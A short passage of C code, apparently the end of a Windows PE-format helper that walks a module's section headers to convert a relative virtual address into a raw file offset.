    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
    {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
    }

    return 0;
}



